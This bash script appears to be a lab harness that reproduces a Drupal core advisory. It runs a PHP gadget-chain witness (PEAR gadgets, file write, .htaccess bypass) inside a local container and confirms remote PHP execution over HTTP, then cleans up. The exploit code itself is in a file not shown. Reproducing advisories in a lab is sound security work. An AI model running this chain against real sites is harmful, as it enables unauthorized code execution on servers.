#!/usr/bin/env bash
#
# F1 gadget-chain witness — SA-CORE-2026-014 / CVE-2026-108097
#
# Runs the full chain against the RUNNING lab:
#   stock PEAR gadgets -> file write -> .htaccess bypass -> PHP execution
#
# Steps:
#   1. copy the witness into the web container
#   2. reset any previous state
#   3. run the chain as the web user (www-data)
#   4. verify the payload executes over HTTP
#   5. always restore the original .htaccess and delete the payload
#
# This only touches the lab container. Do not point it at anything you do
# not own.
#
# Usage:
#   ./lab/scripts/f1-chain.sh [container] [http-base]
set -uo pipefail

CONTAINER="${1:-drupal-vuln-lab-web-1}"
HTTP_BASE="${2:-http://localhost:8080}"
DOCROOT_IN_CONTAINER="/var/www/html"
PAYLOAD_URL="${HTTP_BASE}/sites/default/files/vulnlab_payload.php"

REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
PHP_WITNESS="${REPO_ROOT}/lab/standalone/f1_gadget_chain.php"
PHP_AUTOLOAD="${REPO_ROOT}/lab/standalone/drupal_core_autoload.php"

log()  { printf '\n\033[1;34m==> %s\033[0m\n' "$*"; }
ok()   { printf '  \033[32m[+]\033[0m %s\n' "$*"; }
bad()  { printf '  \033[31m[-]\033[0m %s\n' "$*"; }

cleanup() {
  podman exec -u www-data "$CONTAINER" \
    php /tmp/f1_gadget_chain.php "$DOCROOT_IN_CONTAINER" --cleanup >/dev/null 2>&1 || true
}
trap cleanup EXIT INT TERM

log "Copying the witness into ${CONTAINER}"
podman cp "$PHP_WITNESS" "${CONTAINER}:/tmp/f1_gadget_chain.php"
podman cp "$PHP_AUTOLOAD" "${CONTAINER}:/tmp/drupal_core_autoload.php"

log "Resetting any previous run"
cleanup
ok "clean"

log "Running the chain as www-data"
if ! podman exec -u www-data "$CONTAINER" \
      php /tmp/f1_gadget_chain.php "$DOCROOT_IN_CONTAINER"; then
  bad "the chain did not complete"
  exit 1
fi

log "Verifying PHP execution over HTTP"
BODY="$(curl -sS -m 15 "$PAYLOAD_URL" 2>/dev/null || true)"
if printf '%s' "$BODY" | grep -q 'VULNLAB_RCE_OK:'; then
  ok "executed: ${BODY}"
  RESULT=0
else
  bad "no execution marker in the response"
  printf '    first bytes: %s\n' "$(printf '%s' "$BODY" | head -c 200)"
  RESULT=1
fi

log "Cleaning up"
cleanup
STATUS="$(curl -sS -o /dev/null -w '%{http_code}' -m 15 "$PAYLOAD_URL" 2>/dev/null || echo '???')"
if [ "$STATUS" = "404" ] || [ "$STATUS" = "403" ]; then
  ok "payload no longer reachable (HTTP ${STATUS})"
else
  bad "unexpected status after cleanup: ${STATUS}"
  RESULT=1
fi

printf '\n'
if [ "$RESULT" -eq 0 ]; then
  printf '\033[32m[+] F1 gadget chain reproduced: stock PEAR gadget -> file write -> .htaccess bypass -> RCE\033[0m\n'
else
  printf '\033[31m[-] F1 gadget chain NOT fully reproduced\033[0m\n'
fi
exit "$RESULT"
